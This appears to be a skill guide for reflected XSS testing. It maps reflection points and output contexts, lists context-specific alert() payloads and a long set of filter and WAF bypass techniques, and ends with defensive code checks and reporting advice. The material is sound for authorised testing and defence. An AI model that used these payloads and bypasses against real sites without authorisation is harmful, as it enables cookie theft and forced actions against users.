# Reflection XSS — Skill

## What it is
- User input is reflected immediately in the HTTP response (URL parameter, form field, path segment, or header) without correct output encoding for the context it lands in.
- The payload executes in the victim's browser within the vulnerable site's origin, typically delivered via a crafted link (or via a request the victim's browser makes automatically, e.g. a header it always sends).
- Non-persistent: nothing is stored server-side; the payload only fires for the request that carries it.
- Same origin = same access as the site: cookies without `HttpOnly`, `localStorage` tokens, CSRF token theft, DOM access, forced actions, keylogging, phishing overlays.
- Variants to keep distinct while testing: reflected (server echoes input), stored/persistent (input persisted), DOM-based (client JS reads source and writes to a sink — the server may never see the payload). A single endpoint can be a mix (server reflects into HTML, client JS then re-injects with `innerHTML`).

## Reflection points (where input comes back)
- URL query parameters (GET/POST), including duplicated params and array-style params (`a[]=`, `a=1&a=2` — frameworks often take first vs last differently).
- Path segments / route parameters (`/user/<name>`), 404 and error pages.
- Search boxes, login/error messages, "invalid value" feedback, form fields echoed back on validation failure.
- Hidden form fields and value attributes repopulated from the request.
- HTTP headers echoed into the response: `Referer`, `User-Agent`, `Cookie`, `X-Forwarded-Host`, `X-Forwarded-For`, `Origin`, `Accept-Language`, `Host`.
- Redirect targets: `Location` header, `<meta http-equiv=refresh>`, JS `window.location = '...'` built from input.
- JSON/API responses rendered as HTML (content sniffing) or embedded into a `<script>` block.
- `Content-Type`, filename, and other reflection in upload/download responses; SVG, XML, PDF, RSS outputs.
- Email/notification templates, "share this" previews, contact-form confirmations.
- Multiple reflections of the same value in one response — each may be in a different context; test each occurrence separately.

## Output contexts (each needs different escaping)
Identify the context before choosing a payload. The same input can land in several of these at once.

1. HTML text node: needs `<` and `&` escaped. Break out by opening a tag or an event-driven element.
2. Attribute value, double quoted (`value="..."`): break with `"`, then add a new attribute.
3. Attribute value, single quoted: break with `'`.
4. Unquoted attribute value: break with space, `/`, `>`, or backtick (legacy).
5. URL-bearing attribute (`href`, `src`, `action`, `formaction`, `data`, `poster`, `background`, `lowsrc`, `dynsrc`, `bgsound`): `javascript:` scheme, `data:text/html;base64,...`, or protocol-relative external load.
6. `<script>` block, inside a string literal: need quote + statement break, or `</script>` to escape the block entirely.
7. `<script>` block, outside a string (numeric/variable position): direct JS injection.
8. `<style>` / CSS context: `</style>` breakout or CSS-based injection.
9. HTML comment `<!-- -->`: close with `-->`.
10. Tag name or attribute name position: usually needs the value to be inert; harder, often only possible with parser quirks.
11. Inside `<textarea>` / `<title>` / `<noscript>`: raw-text/RCDATA elements where `<script>` will not execute; need to close the element first.
12. JSON response body interpreted as HTML, or JSON embedded in HTML via `<script>`: `</script>` breakout, `\u2028`/`\u2029`, `JSON.parse('...')` string escape.

## Testing workflow
1. Enumerate every input point: visible params, hidden params, forms (including fields the UI doesn't submit), headers, cookies, path, JSON body fields.
2. Probe with a unique harmless canary, not a full payload first: `xsstest12345`. Submit and locate every occurrence in the raw response source (not the rendered DOM only — check both).
3. Escalate the canary to a character probe: `xsstest12345'"<>/\`&{}()=;:`. Submit and inspect exactly which characters come back raw, which are entity-encoded, which are stripped, which are escaped with a backslash, which are truncated.
4. Characterize the transformation precisely: encoding type (HTML entity, URL, JS `\xNN`, unicode escape), filter (blacklist removed, replaced with empty string, replaced with placeholder), and length limit (send 20/200/2000 chars, find the cutoff and whether truncation occurs before or after the injection point).
5. Determine the exact context of each reflection by reading the surrounding bytes in the response.
6. Build the minimal context-appropriate payload; if a filter blocks a token, mutate that token only and keep the rest constant.
7. Confirm real browser execution — not just that the string appears in the response. Check the JavaScript console / use a benign sink.
8. Record request + raw response snippet + proof of execution. Note response headers: `Content-Type`, `X-Content-Type-Options`, `Content-Security-Policy`, `Set-Cookie` (HttpOnly).
9. Re-test the same input point with the payload URL-encoded, double-encoded, and case-varied to map how many decoding passes happen before the reflection point.

## Payload construction by context (minimal examples)
- HTML text node: `<script>alert(1)</script>`; if `<script>` blocked, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`.
- Double-quoted attribute: `"><img src=x onerror=alert(1)>` (close attribute, close tag, add element).
- Single-quoted attribute: `'><svg onload=alert(1)>`.
- Unquoted attribute: `onmouseover=alert(1) ` or `><script>alert(1)</script>`.
- Inside `<script>` string, single quoted: `';alert(1);//` or `'-alert(1)-'` if the value is used in an expression.
- Inside `<script>` string, double quoted: `";alert(1);//`.
- Inside `<script>`, closing the block: `</script><script>alert(1)</script>` (only works if the parser ends the script element, which it does outside strings).
- `href`/`src` context: `javascript:alert(1)`, `javascript:alert(1)//`, `data:text/html,<script>alert(1)</script>`.
- Inside a comment: `--><script>alert(1)</script>`.
- Inside `<textarea>`: `</textarea><script>alert(1)</script>`.
- For quick context confirmation, a self-contained element like `<img src=x onerror=alert(1)>` works in most HTML contexts and does not depend on a closing tag.

## Filter and WAF bypass (generic, context-first)
Always try the simplest payload first, then mutate only the blocked component.

1. Tag alternatives when `<script>` is blocked: `<svg>`, `<img>`, `<iframe>`, `<details open ontoggle=...>`, `<marquee>`, `<video><source onerror=...>`, `<audio src=x onerror=...>`, `<body onload=...>`, `<input autofocus onfocus=...>`, `<select autofocus onfocus=...>`, `<textarea autofocus onfocus=...>`, `<object data=...>`, `<embed>`, `<math>` with `<mtext>`.
2. Event handlers: `onerror`, `onload`, `onfocus`, `onmouseover`, `ontoggle`, `onanimationend`, `onbegin`, `onscroll`, `onwheel`, `onpageshow`, `onpointerover`, `onformdata`.
3. `javascript:` variants when the scheme is filtered: `java\nscript:`, `java\tscript:`, `JaVaScRiPt:`, ` &#106;avascript:`, `javascript&colon;`, embedded null or CR.
4. Keyword bypass: mixed case `<ScRiPt>`; nested/overlapping `<scr<script>ipt>`; split with attributes `<script x>`; replace spaces with tab, newline, form feed, or `/`; add junk before `>`; break `alert` with comments `al/**/ert(1)` or template literals.
5. Quote manipulation: alternate quote styles, no quotes at all, extra unmatched quotes to shift the parser, backticks where supported.
6. Encoding: HTML numeric/hex entities (`&#x3c;`, `&#60;`), URL encoding (`%3c`), JS escapes (`\x3c`, `\u003c`), double URL encoding when one decode pass happens before the reflection. Legacy targets only: UTF-7, overlong UTF-8, full-width unicode.
7. DOM/JS sinks without `<`: if the value lands in an event handler or a JS string, no angle brackets are needed — use `alert(1)`, `eval(...)`, `alert(document.domain)`.
8. Length limits: shrink the payload (`<svg onload=alert(1)>`), drop to bare `alert(1)` if already in a JS context, or reference an external script (`<script src=//host/x>`) only if length allows.
9. Repeated/decode-once filters: if the filter strips a token once, nesting it once (`<scr<script>ipt>`) can leave the token behind after removal. If it strips repeatedly to empty, look for double-write where the removed part reconstitutes the token.
10. If the response sets a CSP, check it before trying `<script>`: look for `unsafe-inline`, `unsafe-eval`, wildcards, whitelisted hosts with JSONP/angular libraries, missing `base-uri`/`object-src`, and whether the injection point is covered by a nonce/hash.

## What to check (hunting & defense)
- `htmlspecialchars($x)` without proper flags: `ENT_COMPAT` escapes only double quotes, so single-quoted attributes break out; `ENT_NOQUOTES` leaves both open. `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5` with an explicit charset is the safe form.
- `strip_tags` / `htmlentities` misuse — `strip_tags` does not sanitize attributes and can leave event handlers; `htmlentities` with wrong charset can be bypassed.
- `str_replace` that is case-sensitive (missing `strtolower`) → case confusion.
- `str_replace` to empty (vs placeholder) → nested-keyword bypass; removing `<script>` naively leaves `<script>` from `<scr<script>ipt>`.
- Blacklist filtering instead of allowlist/contextual escaping.
- `addslashes` used for an HTML context (it is not HTML escaping).
- Header values (Referer, User-Agent, Cookie, X-Forwarded-Host) echoed without sanitization — often overlooked because the UI never shows them.
- Attribute context vs text-node context treated identically by the encoder.
- Framework sinks that disable autoescaping: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{{{ }}}` in Handlebars, `<%= raw %>`, Jinja2 `|safe`, `Markup()`, Twig `|raw`, `mark_safe`.
- `Content-Type: text/html` on a JSON/API endpoint, and missing `X-Content-Type-Options: nosniff`.
- Double escaping / double decoding bugs: input HTML-encoded once, then decoded by client JS and written with `innerHTML` — the second stage re-enables execution.
- JSON embedded into HTML: `</script>` breakout, `\u2028`/`\u2029`, unescaped `<`/`&` in JSON strings (PHP `json_encode` needs `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT` for embedding).
- Reflection into `Location` header or `window.location` assignment — scheme validation is required, `javascript:` must be rejected.
- CSP present but weak: `unsafe-inline`, `unsafe-eval`, `data:` in `script-src`, missing `object-src`/`base-uri`, or a whitelisted CDN/JSONP endpoint.
- Client-side sinks fed by server reflection: `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, `Function`, `location`, `$.html()`, jQuery selectors.

## Confirming and reporting
- Use benign proof: `alert(document.domain)` proves execution in the target origin; `alert(1)` is acceptable for a bare PoC. Do not exfiltrate real cookies against real users.
- Capture: the exact request, the raw response bytes around the reflection, and browser evidence of execution (console/screenshot).
- Explicitly distinguish three states: reflected raw, reflected but encoded (not exploitable as-is), reflected and executable. Many false positives come from reporting the first two as the third.
- Note whether exploitation requires victim interaction (clicking a link) or fires automatically (header reflection, `onload`, `onerror`).

## Edge cases
- Header reflection into a page viewed by someone else (admin panel, log viewer) is effectively stored — classify accordingly.
- 404/error pages and search pages are the highest-yield reflection surfaces.
- Reflection in a different origin than expected (subdomain, CDN, third-party widget) changes impact and cookie scope.
- Reflection inside SVG, XML, PDF, or CSS responses can still execute depending on how the browser handles the content type.
- Reflection split across two responses or two fields may require chaining both to build the payload.
- Truncation can cut off a closing tag — keep payloads that execute without needing to close anything.

## Quick checklist
- [ ] Every input point enumerated (params, forms, hidden fields, headers, cookies, path).
- [ ] Every reflection occurrence located in the raw response, not just the rendered page.
- [ ] Character-by-character reflection behavior mapped (raw / encoded / stripped / truncated).
- [ ] Context identified for each occurrence and a context-specific payload built.
- [ ] Filter bypass attempted only on the blocked token, keeping the rest constant.
- [ ] Execution confirmed in a real browser, not just string presence.
- [ ] Response headers checked: `Content-Type`, `X-Content-Type-Options`, `Content-Security-Policy`, cookie flags.
- [ ] Server-side and client-side sinks both considered; double-decoding re-injection tested.